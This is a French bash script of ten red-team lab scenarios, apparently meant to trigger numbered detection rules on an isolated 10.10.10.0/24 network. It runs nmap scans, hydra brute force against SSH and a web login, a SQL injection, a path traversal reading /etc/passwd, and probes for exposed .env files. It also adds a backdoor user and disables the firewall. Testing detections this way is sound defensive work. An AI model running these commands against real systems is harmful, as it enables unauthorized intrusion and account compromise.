#!/bin/bash
# =====================================================================
# scenarios.sh — Commandes des 10 scénarios Red Team exécutés depuis
# kali-attack (10.10.10.40) contre les cibles du laboratoire.
#
# ⚠️ À exécuter UNIQUEMENT dans le réseau isolé 10.10.10.0/24.
# Chaque scénario peut être exécuté indépendamment (copier la section).
# =====================================================================

TARGET_LINUX="10.10.10.30"
TARGET_WINSERVER="10.10.10.60"

# --- Scénario 1 : Scan de ports TCP (SYN scan) — règle 100011 ---
echo "[1] Scan de ports TCP..."
nmap -sS -T4 -p- "$TARGET_LINUX"

# --- Scénario 2 : Scan de ports UDP — règle 100041 ---
echo "[2] Scan de ports UDP..."
nmap -sU --top-ports 20 "$TARGET_LINUX"

# --- Scénario 3 : Accès à un port sensible (RDP/SMB/SQL) — règle 100030 ---
echo "[3] Scan de ports sensibles..."
nmap -p 21,23,445,1433,3306,3389 "$TARGET_LINUX"

# --- Scénario 4 : Brute force SSH — règle 100021 ---
echo "[4] Brute force SSH..."
echo -e "azerty\n123456\nadmin1234\npassword\ntest123" > /tmp/wordlist_test.txt
hydra -l linux -P /tmp/wordlist_test.txt ssh://"$TARGET_LINUX" -t 4

# --- Scénario 5 : Brute force Web (formulaire de connexion) — règle 100220 ---
echo "[5] Brute force Web..."
echo -e "azerty\n123456\nadmin1234\npassword\ntest123\nqwerty\nletmein\nadmin\nroot\niloveyou\nwelcome\nsunshine" > /tmp/wordlist_test.txt
hydra -l admin -P /tmp/wordlist_test.txt "$TARGET_LINUX" http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# --- Scénario 6 : Injection SQL — règle 100210 ---
echo "[6] Injection SQL..."
curl -G "http://$TARGET_LINUX/item.php" --data-urlencode "id=' OR 1=1-- -"

# --- Scénario 7 : Path Traversal — règle 100230 ---
echo "[7] Path Traversal..."
curl "http://$TARGET_LINUX/download.php?file=../../../../etc/passwd"

# --- Scénario 8 : Fichier sensible exposé (.env / .git / .bak) — règle 100240 ---
echo "[8] Accès fichiers sensibles..."
curl -I "http://$TARGET_LINUX/.env"
curl -I "http://$TARGET_LINUX/config.php.bak"

# --- Scénario 9 : Compromission système (user + sudo + pare-feu) — règles 100080/100090/100070 ---
echo "[9] Compromission système (à exécuter en SSH sur app-linux, pas depuis Kali) :"
cat << 'EOF'
  ssh linux@10.10.10.30
  sudo useradd -m backdoor_test
  sudo usermod -aG sudo linux
  sudo ufw disable      # capturer l'alerte, puis IMMÉDIATEMENT :
  sudo ufw enable        # réactiver le pare-feu
EOF

# --- Scénario 10 : Reconnaissance web combinée (directory scan) — règle 100200 ---
echo "[10] Scan de répertoires (Gobuster)..."
gobuster dir -u "http://$TARGET_LINUX" -w /usr/share/wordlists/dirb/common.txt
